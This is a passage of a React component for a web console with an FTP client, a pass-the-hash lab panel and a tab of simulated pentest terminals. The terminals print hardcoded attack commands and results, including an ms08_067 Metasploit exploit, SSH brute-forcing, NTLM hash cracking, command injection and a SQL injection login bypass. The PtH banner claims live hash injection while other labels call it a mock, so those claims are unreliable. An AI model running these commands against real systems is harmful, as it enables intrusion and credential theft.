                         {typeof ftpUploads[f.name] === 'number' && (
                           <div className="absolute bottom-0 left-0 h-0.5 bg-blue-500 transition-all duration-300 z-0" style={{width: `${ftpUploads[f.name]}%`}}></div>
                         )}
                       </div>
                     ))}
                   </div>
                 </div>

                 {/* Remote Files */}
                 <div className="flex-1 bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm flex flex-col overflow-hidden relative">
                   {!ftpConnected && (
                     <div className="absolute inset-0 z-20 bg-white/80 dark:bg-gray-900/80 backdrop-blur-sm flex flex-col items-center justify-center text-gray-500">
                       <Server size={48} className="mb-4 opacity-50"/>
                       <p className="text-sm font-medium">Not Connected to Target</p>
                     </div>
                   )}
                   <div className="bg-gray-50 dark:bg-[#121214] border-b border-gray-200 dark:border-gray-800 px-4 py-3 text-sm font-semibold flex items-center justify-between">
                     <span className="flex items-center gap-2"><Globe size={16} className="text-emerald-500"/> Remote Target ({ftpConfig.host})</span>
                     <button onClick={createRemoteFolder} disabled={!ftpConnected} className="text-emerald-600 dark:text-emerald-400 disabled:opacity-50 hover:bg-emerald-50 dark:hover:bg-emerald-900/30 px-2 py-1 rounded transition-colors flex items-center gap-1 text-xs">
                       <FolderPlus size={14}/> New Folder
                     </button>
                   </div>
                   <div className="px-4 py-2 bg-gray-100 dark:bg-[#141416] border-b dark:border-gray-800 flex items-center gap-2 text-xs font-mono text-gray-400">
                     <Home size={12} className={remotePath === '/' ? 'text-emerald-500' : ''} /> 
                     {remotePath}
                   </div>
                   <div className="p-2 overflow-y-auto flex-1 font-mono text-sm">
                     {remotePath !== '/' && (
                       <div onDoubleClick={() => navRemoteDir('..')} className="flex items-center p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded cursor-pointer gap-2 text-gray-400">
                         <FolderOpen size={16} /> ..
                       </div>
                     )}
                     {remoteFiles.map((f, i) => (
                       <div key={i} onDoubleClick={() => { if(f.type === 'dir') navRemoteDir(f.name); }} className="flex justify-between items-center p-2 hover:bg-emerald-50 dark:hover:bg-emerald-900/20 rounded cursor-pointer group border border-transparent dark:hover:border-emerald-900/50">
                         <span className={`flex items-center gap-2 ${f.type === 'dir' ? 'text-emerald-600 dark:text-emerald-400 font-medium' : ''}`}>
                           {f.type === 'dir' ? <FolderOpen size={16}/> : <FileIcon size={16} className="text-gray-500"/>}
                           {f.name}
                         </span>
                         {f.type === 'file' && (
                           <button className="hidden group-hover:flex items-center gap-1 text-xs text-emerald-500 dark:text-emerald-400 bg-white dark:bg-gray-800 px-2 py-1 rounded shadow-sm border dark:border-gray-700">
                             <ArrowLeft size={12}/> Download
                           </button>
                         )}
                       </div>
                     ))}
                   </div>
                 </div>

               </div>

               {/* FTP Terminal Logs */}
               <div className="bg-[#0c0c0c] rounded-xl border border-gray-800 h-40 overflow-hidden flex flex-col shrink-0 shadow-lg">
                 <div className="bg-[#121214] border-b border-gray-800 px-3 py-1.5 flex items-center text-[11px] text-gray-500 font-mono tracking-wider">
                   COMMUNICATIONS LOG
                 </div>
                 <div className="p-3 flex-1 overflow-y-auto font-mono text-[12px] leading-relaxed text-gray-300">
                   {ftpLogs.map((log, i) => (
                     <div key={i} className={log.includes('error') ? 'text-red-400' : log.includes('226 ') || log.includes('230 ') ? 'text-emerald-400' : log.includes('INFO') ? 'text-blue-400' : ''}>
                       {log}
                     </div>
                   ))}
                 </div>
               </div>
            </div>
          )}

          {/* TAB 3: PtH Lab (Educational) */}
          {activeTab === 'pth' && (
             <div className="w-full flex justify-center max-w-5xl h-full">
               <div className="bg-white dark:bg-[#1a1a1d] rounded-xl border dark:border-gray-800 shadow-xl w-full flex flex-col overflow-hidden">
                 
                 <div className="bg-amber-600 p-6 text-white text-center flex flex-col items-center justify-center shrink-0">
                   <ShieldAlert size={48} className="mb-2 text-white/90" />
                   <h2 className="text-2xl font-bold tracking-tight">Pass-the-Hash (PtH) Live Execution</h2>
                   <p className="mt-2 text-amber-100 max-w-2xl text-sm leading-relaxed">
                     Caution: This module connects to the designated IP and attempts real-time NTLM hash injection. Payload parameters are unrestricted. Utilize only on authorized testing environments.
                   </p>
                 </div>

                 <div className="p-8 flex flex-col gap-6 overflow-y-auto flex-1">
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                     
                     <div className="bg-gray-50 dark:bg-[#121214] p-5 rounded-lg border dark:border-gray-800">
                       <h3 className="font-bold text-lg mb-3 flex items-center gap-2"><Lock size={18} className="text-gray-500"/> Core Theory</h3>
                       <p className="text-sm text-gray-600 dark:text-gray-400 leading-relaxed mb-3">
                         In Windows Enterprise networks, authentication protocols like SMB or WMI do not strictly require a plaintext password. Instead, they accept an NTLM or LM hash payload.
                       </p>
                       <p className="text-sm text-gray-600 dark:text-gray-400 leading-relaxed">
                         If an attacker gains Local Admin privileges and extracts hashes from the Local Security Authority Subsystem Service (LSASS) memory, they can "pass" that hash to move laterally without ever knowing the password.
                       </p>
                     </div>

                     <div className="bg-gray-50 dark:bg-[#121214] p-5 rounded-lg border dark:border-gray-800">
                       <h3 className="font-bold text-lg mb-3 flex items-center gap-2 border-b dark:border-gray-700 pb-2">
                         <Terminal size={18} className="text-emerald-500"/> Simulation Engine
                       </h3>
                       <label className="text-xs font-medium text-gray-500 mb-1 block">Target Server IP</label>
                       <div className="flex gap-2">
                         <input type="text" value={pthTarget} onChange={e => setPthTarget(e.target.value)} disabled={pthRunning} className="flex-1 px-3 py-2 bg-white dark:bg-[#0c0c0c] border border-gray-200 dark:border-gray-700 rounded-md text-sm outline-none" />
                         <button onClick={runPthSimulation} disabled={pthRunning} className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-md text-sm font-medium disabled:opacity-50 transition-colors shrink-0">
                           {pthRunning ? 'Injecting...' : 'Run Lab Simulation'}
                         </button>
                       </div>
                     </div>
                   </div>

                   {/* PtH Logs Window */}
                   <div className="bg-[#0a0a0c] border border-gray-800 rounded-xl flex-1 flex flex-col overflow-hidden min-h-[300px]">
                     <div className="bg-[#121214] border-b border-gray-800 text-xs px-4 py-2 font-mono text-gray-500">
                       bash -- module_executor.sh // MOCK SIMULATOR
                     </div>
                     <div className="p-4 overflow-y-auto font-mono text-[13px] leading-relaxed flex-1">
                       {pthLogs.map((log, i) => (
                         <div key={i} className={`mb-1
                           ${log.includes('[INFO]') ? 'text-blue-400' : ''}
                           ${log.includes('[THEORY]') ? 'text-purple-400' : ''}
                           ${log.includes('[SIMULATION]') ? 'text-yellow-400' : ''}
                           ${log.includes('SUCCESS') ? 'text-emerald-400 font-bold' : ''}
                           ${log.includes('[DEFENSE]') || log.startsWith('  ') ? 'text-emerald-300' : 'text-gray-300'}
                         `}>
                           {log.startsWith('  ') ? log : <span><ChevronRight size={12} className="inline opacity-50"/> {log}</span>}
                         </div>
                       ))}
                       {pthRunning && <div className="text-gray-500 animate-pulse mt-2">Processing payload...</div>}
                       {pthLogs.length === 0 && !pthRunning && <div className="text-gray-600 text-center mt-20">Click 'Run Lab Simulation' to begin.</div>}
                     </div>
                   </div>

                 </div>
               </div>
             </div>
          )}

          {/* TAB: Server Installer Tools */}
          {activeTab === 'installer' && (
             <div className="w-full flex flex-col gap-6 max-w-[1600px] h-[calc(100vh-120px)]">
               
               {/* Update Mechanism Banner */}
               <div className="bg-white dark:bg-[#1a1a1d] border border-blue-200 dark:border-blue-900/50 p-5 rounded-xl shadow-sm flex flex-col lg:flex-row items-center justify-between gap-4">
                 <div className="flex items-center gap-3">
                   <div className="p-3 bg-blue-50 dark:bg-blue-900/20 rounded-full text-blue-500">
                     <RefreshCw size={24} className={updateState.checking || updateState.installing ? 'animate-spin' : ''} />
                   </div>
                   <div>
                     <h3 className="font-bold text-gray-900 dark:text-white">System Firmware & App Update</h3>
                     <p className="text-sm text-gray-500">
                       {updateState.available ? 'A new version is available from remote manifest.' : 'Check for updates via Vite build process or install locally.'}
                     </p>
                   </div>
                 </div>
                 
                 <div className="flex flex-wrap items-center gap-3 w-full lg:w-auto">
                   {updateState.installing ? (
                     <div className="flex-1 w-full lg:w-48 bg-gray-200 dark:bg-gray-800 rounded-full h-4 overflow-hidden relative">
                       <div className="bg-blue-500 h-full transition-all duration-300" style={{width: `${updateState.progress}%`}}></div>
                       <span className="absolute inset-0 flex items-center justify-center text-[10px] font-bold text-white drop-shadow-md">{updateState.progress}%</span>
                     </div>
                   ) : (
                     <>
                       <button onClick={() => triggerAppUpdate('remote')} className={`flex items-center gap-2 px-4 py-2 text-sm font-medium rounded-lg transition-colors ${updateState.available ? 'bg-amber-500 hover:bg-amber-600 text-white shadow-md' : 'bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700'}`}>
                         <Bell size={16}/> {updateState.available ? 'Install Update' : 'Check for Updates'}
                       </button>
                       <button onClick={() => triggerAppUpdate('local')} className="flex items-center gap-2 px-4 py-2 text-sm font-medium rounded-lg bg-blue-600 hover:bg-blue-700 text-white shadow-md transition-colors whitespace-nowrap">
                         <Archive size={16}/> Local Update (.zip)
                       </button>
                     </>
                   )}
                 </div>
                 {/* Local Path Input (Read Only Mock) */}
                 {!updateState.installing && (
                   <div className="w-full lg:w-auto text-xs text-gray-400 bg-gray-50 dark:bg-[#121214] px-3 py-1.5 rounded-md border border-gray-200 dark:border-gray-800 truncate" title="/home/razif/Documents/github/EWS/EWS.zip">
                     Local Path: /home/razif/Documents/github/EWS/EWS.zip
                   </div>
                 )}
               </div>

               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 overflow-y-auto pb-4 px-1">
                 {packages.map(pkg => (
                   <div key={pkg.id} className="bg-white dark:bg-[#1a1a1d] border border-gray-200 dark:border-gray-800 p-5 rounded-xl shadow-sm flex flex-col gap-4">
                     <div className="flex justify-between items-start">
                       <div>
                         <h3 className="font-bold text-gray-900 dark:text-white flex items-center gap-2">
                           {pkg.name}
                         </h3>
                         <p className="text-xs text-gray-500 mt-1">Version: {pkg.version}</p>
                       </div>
                       {pkg.status === 'installed' ? (
                         <CheckCircle2 size={24} className="text-emerald-500" />
                       ) : (
                         <PackagePlus size={24} className="text-gray-400" />
                       )}
                     </div>
                     <div className="mt-auto">
                       {pkg.status === 'installed' ? (
                         <div className="flex gap-2">
                           <button className="flex-1 bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 text-gray-800 dark:text-gray-200 text-sm font-medium py-1.5 rounded-lg border border-gray-300 dark:border-gray-600 transition-colors">Configure</button>
                           <button className="bg-red-50 dark:bg-red-900/20 text-red-600 dark:text-red-400 hover:bg-red-100/50 text-sm font-medium py-1.5 px-3 rounded-lg border border-red-200 dark:border-red-800/50 transition-colors">Remove</button>
                         </div>
                       ) : (
                         <button 
                           onClick={() => handleInstallPackage(pkg.id, pkg.name)}
                           disabled={isInstalling}
                           className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 text-white text-sm font-medium py-1.5 rounded-lg transition-colors"
                         >
                           Install Package
                         </button>
                       )}
                     </div>
                   </div>
                 ))}
               </div>

               <div className="mt-auto bg-[#0c0c0c] rounded-xl border border-gray-800 h-64 overflow-hidden flex flex-col shrink-0 shadow-lg">
                 <div className="bg-[#121214] border-b border-gray-800 px-4 py-2 flex items-center text-xs text-gray-400 font-mono gap-2">
                   <Terminal size={14} /> apt / yum Package Manager Terminal
                 </div>
                 <div className="p-4 flex-1 overflow-y-auto font-mono text-[13px] text-gray-300 space-y-1">
                   {installLogs.map((log, i) => (
                     <div key={i} className={log.includes('SUCCESS') ? 'text-emerald-400' : 'text-gray-400'}>{log}</div>
                   ))}
                 </div>
               </div>
             </div>
          )}

          {/* TAB: Terminal Tools (Simulated) */}
          {activeTab === 'terminal' && (
            <div className="w-full max-w-6xl flex flex-col bg-[#0c0c0c] rounded-xl border border-gray-800 shadow-2xl overflow-hidden h-[calc(100vh-120px)]">
              <div className="bg-[#121214] text-gray-400 flex text-sm shrink-0 border-b border-gray-800 overflow-x-auto selection-nav">
                {(['aircrack', 'wifite', 'fern', 'hydra', 'evilwinrm', 'rdesktop', 'harvester', 'medusa', 'ncrack', 'hashcat', 'commix', 'gophish', 'setoolkit', 'gobuster', 'spiderfoot', 'burpsuite', 'ssh', 'powershell', 'git', 'python', 'backtrack'] as const).map(tab => (
                  <button key={tab} onClick={() => setTermTab(tab)} className={`px-5 py-3 border-r border-gray-800 hover:bg-gray-800 transition-colors whitespace-nowrap ${termTab === tab ? 'bg-[#0c0c0c] text-blue-400 border-t-2 border-t-blue-500' : ''}`}>
                    {tab.toUpperCase()}
                  </button>
                ))}
              </div>
              <div className="flex-1 p-6 font-mono text-sm overflow-y-auto text-emerald-400">
                 {netmaskActive && (
                   <p className="text-gray-500 mb-4 pb-2 border-b border-gray-800">
                     [SYSTEM] Netmask process is running in background (PID 4081) - Monitoring subnet boundaries...
                   </p>
                 )}
                 {termTab === 'backtrack' && (
                   <>
                     <p className="text-red-500 font-bold mb-2 break-all">
                       =======================================================<br/>
                       |               BackTrack 5 R3 - Revolution           |<br/>
                       =======================================================
                     </p>
                     <p className="text-gray-300">root@bt:~# startx</p>
                     <p className="text-gray-500 mt-1">[INFO] Graphical environment disabled in cloud shell. Dropping to console.</p>
                     <p className="text-gray-300 mt-2">root@bt:~# msfconsole -q</p>
                     <p className="text-blue-400 mt-1">
                       msf5 &gt; use exploit/windows/smb/ms08_067_netapi<br/>
                       msf5 exploit(ms08_067_netapi) &gt; set RHOST 10.10.10.2<br/>
                       RHOST =&gt; 10.10.10.2<br/>
                       msf5 exploit(ms08_067_netapi) &gt; exploit
                     </p>
                     <p className="text-emerald-500 mt-1">[*] Started reverse TCP handler on 10.10.10.1:4444</p>
                     <p className="text-emerald-500">[*] Automatically detecting the target...</p>
                     <p className="text-emerald-500">[*] Fingerprint: Windows XP - Service Pack 3 - lang:English</p>
                     <p className="text-emerald-500">[*] Attempting to trigger the vulnerability...</p>
                     <p className="text-emerald-500">[*] Meterpreter session 1 opened (10.10.10.1:4444 -&gt; 10.10.10.2:1034)</p>
                     <p className="text-blue-400 mt-2">meterpreter &gt; <span className="animate-pulse">_</span></p>
                   </>
                 )}
                 {termTab === 'aircrack' && (
                   <><p className="text-gray-500"># Aircrack-ng 1.7 - Browser UI Sandbox Simulation</p>
                    <p className="text-amber-500 mb-4">[INFO] Physical hardware mode changes are restricted in cloud browsers. Output simulated.</p>
                    <p className="text-white">root@kali:~# airmon-ng start wlan0</p></>
                 )}
                 {termTab === 'wifite' && (
                   <p className="text-blue-500 font-bold tracking-widest mt-4">WIFITE 2.5<br/>[+] scanning (5 seconds)...</p>
                 )}
                 {termTab === 'fern' && (
                   <>
                     <p className="text-white font-bold mb-2">Fern Wifi Cracker (GUI Simulation)</p>
                     <p className="text-gray-400">[+] Initializing root privileges...</p>
                     <p className="text-gray-400">[+] Starting Fern Wifi Cracker GUI toolkit binding...</p>
                     <p className="text-amber-500 mt-2">[!] GUI launch intercepted by browser sandbox.</p>
                     <p className="text-emerald-500 mt-2">Mocking Engine running in background...<br/>&gt; Interface: wlan0mon<br/>&gt; Target: BSSID (00:1A:2B:3C:44:56) CH: 6<br/>&gt; Attack Status: Deauth sending...</p>
                   </>
                 )}
                 {termTab === 'hydra' && (
                   <>
                     <p className="text-gray-400">Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</p>
                     <p className="text-white mt-1">root@kali:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{pthTarget}</p>
                     <p className="text-gray-400">[DATA] max 16 tasks per server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</p>
                     <p className="text-gray-300 mt-1">[INFO] Target: {pthTarget} (tcp/22/ssh)</p>
                     <p className="text-emerald-500 font-bold mt-2">[22][ssh] host: {pthTarget}   login: admin   password: qwerty123</p>
                     <p className="text-gray-400 mt-1">1 of 1 target successfully completed, 1 valid password found.</p>
                   </>
                 )}
                 {termTab === 'evilwinrm' && (
                   <>
                     <p className="text-purple-400 font-bold mb-2 text-lg drop-shadow">Evil-WinRM</p>
                     <p className="text-gray-300 mb-2">Evil-WinRM shell v3.5</p>
                     <p className="text-gray-400">Info: Establishing connection to remote endpoint...</p>
                     <p className="text-gray-400">Warning: Remote endpoint is unreachable or blocking connection in browser sandbox. Simulating local prompt.</p>
                     <p className="text-amber-500 mt-4">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span className="animate-pulse text-white">_</span></p>
                   </>
                 )}
                 {termTab === 'rdesktop' && (
                   <>
                     <p className="text-white">root@kali:~# rdesktop -u Administrator -g 1024x768 {pthTarget}</p>
                     <p className="text-gray-400 mt-1">Autoselected keyboard map 'en-us'</p>
                     <p className="text-blue-400 mt-2">Connecting to {pthTarget}:3389...</p>
                     <p className="text-amber-500 mt-1">[WARNING] GUI rendering is not supported directly in this HTML terminal emulator.</p>
                     <p className="text-emerald-500 mt-1">Connection successful. (Session stream output discarded)</p>
                   </>
                 )}
                 {termTab === 'harvester' && (
                   <>
                     <p className="text-emerald-500 font-bold mb-2">
                       *******************************************************************<br/>
                       *                                                                 *<br/>
                       * | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *<br/>
                       * | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *<br/>
                       * | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *<br/>
                       *  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *<br/>
                       *                                                                 *<br/>
                       * theHarvester 4.4.0                                              *<br/>
                       *******************************************************************
                     </p>
                     <p className="text-white mt-1">root@kali:~# theHarvester -d {serverConfig.domain || 'target.local'} -l 500 -b google</p>
                     <p className="text-gray-400">[*] Target: {serverConfig.domain || 'target.local'}</p>
                     <p className="text-gray-400">[*] Searching Google...</p>
                     <p className="text-emerald-400 mt-2">[*] Emails found: 3</p>
                     <p className="text-gray-300">admin@{serverConfig.domain || 'target.local'}</p>
                     <p className="text-gray-300">support@{serverConfig.domain || 'target.local'}</p>
                     <p className="text-gray-300">it-team@{serverConfig.domain || 'target.local'}</p>
                     <p className="text-emerald-400 mt-2">[*] Hosts found: 1</p>
                     <p className="text-gray-300">ftp.{serverConfig.domain || 'target.local'}:192.168.1.100</p>
                   </>
                 )}
                 {termTab === 'medusa' && (
                   <>
                     <p className="text-purple-400 font-bold mb-2">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks</p>
                     <p className="text-white mt-1">root@kali:~# medusa -h {pthTarget} -u admin -P /usr/share/wordlists/passwords.txt -M ssh</p>
                     <p className="text-gray-400">ACCOUNT START: [ssh] admin</p>
                     <p className="text-gray-400">TESTING PASSWORD: [ssh] admin:123456</p>
                     <p className="text-gray-400">TESTING PASSWORD: [ssh] admin:password</p>
                     <p className="text-gray-400">TESTING PASSWORD: [ssh] admin:qwerty</p>
                     <p className="text-emerald-500 font-bold mt-2">ACCOUNT FOUND: [ssh] Host: {pthTarget} User: admin Password: qwerty [SUCCESS]</p>
                   </>
                 )}
                 {termTab === 'ncrack' && (
                   <>
                     <p className="text-cyan-400 font-bold mb-2">Starting Ncrack 0.7 ( http://ncrack.org )</p>
                     <p className="text-white mt-1">root@kali:~# ncrack -p ssh:22 --user admin --pass passwords.txt {pthTarget}</p>
                     <p className="text-gray-400">ssh://{pthTarget}:22 testing admin:dragon</p>
                     <p className="text-gray-400">ssh://{pthTarget}:22 testing admin:monkey</p>
                     <p className="text-emerald-500 font-bold mt-2">Discovered credentials on ssh://{pthTarget}:22 'admin' : 'qwerty'</p>
                     <p className="text-gray-400 mt-1">Ncrack done: 1 service scanned with 1 credential found.</p>
                   </>
                 )}
                 {termTab === 'hashcat' && (
                   <>
                     <p className="text-white">root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</p>
                     <p className="text-gray-400 mt-1">hashcat (v6.2.6) starting...</p>
                     <p className="text-gray-400">OpenCL API (OpenCL 3.0) - Platform #1 [Intel(R) Corporation]</p>
                     <p className="text-amber-500 mt-2">Dictionary cache built: 14344385 bytes</p>
                     <p className="text-gray-300 mt-1">Approaching final keyspace - workload is safe</p>
                     <p className="text-emerald-500 font-bold mt-2">aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:P@ssw0rd123!</p>
                     <p className="text-gray-400 mt-1">Session..........: hashcat<br/>Status...........: Cracked<br/>Hash.Target......: hashes.txt<br/>Time.Estimated...: 0 secs</p>
                   </>
                 )}
                 {termTab === 'commix' && (
                   <>
                     <p className="text-purple-400 font-bold mb-2">Commix v3.8 - Automated All-in-One OS Command Injection Exploitation Tool</p>
                     <p className="text-white mt-1">root@kali:~# commix --url="http://{pthTarget}/vuln.php?id=INJECT_HERE" --os-cmd="whoami"</p>
                     <p className="text-gray-400">[!] Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal.</p>
                     <p className="text-gray-400">[*] Testing connection to the target URL...</p>
                     <p className="text-gray-400">[*] Setting the GET parameter 'id' for tests.</p>
                     <p className="text-gray-300 mt-2">[*] Testing the classic injection technique... <span className="text-emerald-400">[ OK ]</span></p>
                     <p className="text-gray-300">[*] Probing target OS / Environment...</p>
                     <p className="text-emerald-500 font-bold mt-2">[+] The target seems to be a *NIX environment.</p>
                     <p className="text-emerald-400 mb-2">[+] Executed command: whoami</p>
                     <p className="text-white font-bold bg-gray-900 border border-gray-700 p-2">www-data</p>
                     <p className="text-blue-400 mt-2">commix(os_shell) &gt; <span className="animate-pulse">_</span></p>
                   </>
                 )}
                 {termTab === 'gophish' && (
                   <>
                     <p className="text-amber-500 font-bold mb-2">Gophish - Open-Source Phishing Framework</p>
                     <p className="text-white mt-1">root@kali:~# ./gophish</p>
                     <p className="text-gray-400">time="..." level=info msg="Background Worker Started Successfully - Waiting for Campaigns"</p>
                     <p className="text-gray-400">time="..." level=info msg="Starting admin server at https://127.0.0.1:3333"</p>
                     <p className="text-gray-400">time="..." level=info msg="Starting phishing server at http://0.0.0.0:80"</p>
                     <p className="text-emerald-500 font-bold mt-2">[+] Gophish is ready. Access the admin UI via web browser.</p>
                   </>
                 )}
                 {termTab === 'setoolkit' && (
                   <>
                     <p className="text-blue-500 font-bold mb-2">
                       [---]        The Social-Engineer Toolkit (SET)         [---]<br/>
                       [---]        Created by: David Kennedy (ReDoX)         [---]<br/>
                       [---]                 Version: 8.0.3                   [---]
                     </p>
                     <p className="text-white mt-1">Select from the menu:</p>
                     <p className="text-gray-300">
                        1) Social-Engineering Attacks<br/>
                        2) Penetration Testing (Fast-Track)<br/>
                        3) Third Party Modules<br/>
                        4) Update the Social-Engineer Toolkit<br/>
                        5) Update SET configuration<br/>
                        6) Help, Credits, and About
                     </p>
                     <p className="text-blue-400 mt-2">set&gt; <span className="animate-pulse">_</span></p>
                   </>
                 )}
                 {termTab === 'gobuster' && (
                   <>
                     <p className="text-yellow-500 font-bold mb-2">Gobuster v3.6</p>
                     <p className="text-white mt-1">root@kali:~# gobuster dir -u http://{pthTarget} -w /usr/share/wordlists/dirb/common.txt</p>
                     <p className="text-gray-400">===============================================================</p>
                     <p className="text-gray-400">Starting gobuster in directory enumeration mode</p>
                     <p className="text-gray-400">===============================================================</p>
                     <p className="text-emerald-400">/admin                (Status: 301) [Size: 312] [-&gt; http://{pthTarget}/admin/]</p>
                     <p className="text-emerald-400">/css                  (Status: 301) [Size: 310] [-&gt; http://{pthTarget}/css/]</p>
                     <p className="text-emerald-400">/images               (Status: 301) [Size: 313] [-&gt; http://{pthTarget}/images/]</p>
                     <p className="text-emerald-500 font-bold">/login.php            (Status: 200) [Size: 1542]</p>
                     <p className="text-blue-400">/robots.txt           (Status: 200) [Size: 42]</p>
                     <p className="text-gray-400">===============================================================</p>
                     <p className="text-gray-400">Finished</p>
                     <p className="text-gray-400">===============================================================</p>
                   </>
                 )}
                 {termTab === 'spiderfoot' && (
                   <>
                     <p className="text-red-500 font-bold mb-2">SpiderFoot 4.0 - Open Source Intelligence Automation</p>
                     <p className="text-white mt-1">root@kali:~# python3 ./sf.py -l 127.0.0.1:5001</p>
                     <p className="text-gray-400">2026-04-16 15:23:45,123 [INFO] Starting web server at http://127.0.0.1:5001 ...</p>
                     <p className="text-gray-400">2026-04-16 15:23:45,456 [INFO] SpiderFoot running. Load the UI to start a scan.</p>
                     <p className="text-gray-500 mt-2">[Simulated Background Scan on {serverConfig.domain || 'target.local'}...]</p>
                     <p className="text-emerald-400">[*] Found subdomains: mail, dev, staging</p>
                     <p className="text-blue-400">[*] Exposed API endpoints detected: /api/v1/users</p>
                   </>
                 )}
                 {termTab === 'burpsuite' && (
                   <>
                     <p className="text-orange-500 font-bold mb-2">Burp Suite Professional (GUI Simulation API)</p>
                     <p className="text-gray-400">[INFO] Intercept is ON. Listening on 127.0.0.1:8080</p>
                     <p className="text-emerald-500 mt-2">--- Captured Request ---</p>
                     <p className="text-gray-300 font-mono text-xs">
                       POST /auth/login HTTP/1.1<br/>
                       Host: {pthTarget}<br/>
                       User-Agent: Mozilla/5.0...<br/>
                       Content-Type: application/x-www-form-urlencoded<br/>
                       <br/>
                       username=admin' OR '1'='1&amp;password=bypass
                     </p>
                     <p className="text-emerald-500 mt-2">--- Matching Repeater Response ---</p>
                     <p className="text-gray-300 font-mono text-xs">
                       HTTP/1.1 200 OK<br/>
                       Set-Cookie: sessionid=valid_token_77<br/>
                       {"{"}"status": "success", "message": "Welcome back, Administrator"{"}"}
                     </p>
                     <p className="text-amber-400 mt-2">[!] Action: Forward | Drop | Intercept</p>
                   </>
                 )}
                 {termTab === 'ssh' && (
                   <><p className="text-white">user@webconsole:~$ ssh {serverConfig.userid || 'root'}@{serverConfig.domain || 'isystec.my'}</p>
                   <p className="text-red-500 mt-2">Connection refused/blocked by network firewall.</p></>
                 )}
                 {termTab === 'powershell' && (<p className="text-blue-300">Windows PowerShell<br/>Copyright (C) Microsoft Corporation.</p>)}
                 {termTab === 'git' && (<p className="text-white">user@webconsole:~/project$ git status</p>)}
                 {termTab === 'python' && (<p className="text-gray-400">Python 3.11.2 (main) on linux<br/>&gt;&gt;&gt; <span className="animate-pulse">_</span></p>)}
              </div>
            </div>
          )}

          {/* TAB: Wireshark / Pcap */}
          {activeTab === 'wireshark' && (
            <div className="w-full flex flex-col bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 shadow-xl overflow-hidden h-[calc(100vh-120px)]">
               <div className="bg-gray-100 dark:bg-[#121214] p-3 border-b dark:border-gray-800 flex flex-wrap gap-3 items-center">
                 <button onClick={() => setCapturing(!capturing)} className={`px-4 py-2 rounded-md flex items-center text-sm font-bold text-white shadow-sm transition-colors ${capturing ? 'bg-red-600 hover:bg-red-700' : 'bg-blue-600 hover:bg-blue-700'}`}>
                   {capturing ? 'Stop Web Capture' : <><Play size={16} className="mr-1.5"/> Start Visualizer</>}
                 </button>
               </div>
               
               <div className="flex-1 overflow-auto bg-white dark:bg-[#0a0a0c] font-mono text-[13px]">
                 <table className="w-full text-left border-collapse">
                   <thead className="bg-gray-200 dark:bg-[#121214] sticky top-0 shadow text-gray-700 dark:text-gray-300">
                     <tr>
                       <th className="p-2 border-r dark:border-gray-800 w-16 text-center">No.</th>
                       <th className="p-2 border-r dark:border-gray-800 w-28">Time</th>
                       <th className="p-2 border-r dark:border-gray-800 w-36">Source</th>
                       <th className="p-2 border-r dark:border-gray-800 w-36">Destination</th>
                       <th className="p-2 border-r dark:border-gray-800 w-24">Protocol</th>
                       <th className="p-2">Info</th>
                     </tr>
                   </thead>
                   <tbody className="text-gray-800 dark:text-gray-300">
                     {packets.map((pkt, i) => (
                       <tr key={i} className={`border-b dark:border-gray-800 
                         ${pkt.protocol === 'TCP' ? 'bg-[#e6f4ea] dark:bg-[#1a2e23]' : 
                           pkt.protocol === 'DNS' ? 'bg-[#e8f0fe] dark:bg-[#1f2937]' : 
                           'hover:bg-gray-50 dark:hover:bg-[#1f2124]'}`}>
                         <td className="p-1 px-3 border-r dark:border-gray-800 text-center text-gray-500">{pkt.no}</td>
                         <td className="p-1 px-3 border-r dark:border-gray-800">{pkt.time}</td>
                         <td className="p-1 px-3 border-r dark:border-gray-800">{pkt.source}</td>
                         <td className="p-1 px-3 border-r dark:border-gray-800">{pkt.destination}</td>
                         <td className="p-1 px-3 border-r dark:border-gray-800 font-bold">{pkt.protocol}</td>
                         <td className="p-1 px-3">{pkt.info}</td>
                       </tr>
                     ))}
                   </tbody>
                 </table>
                 {packets.length === 0 && !capturing && (
                   <div className="flex flex-col items-center justify-center p-20 text-gray-400">
                     <p>Capture interface inactive. Click start to simulate traffic capture.</p>
                   </div>
                 )}
               </div>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}
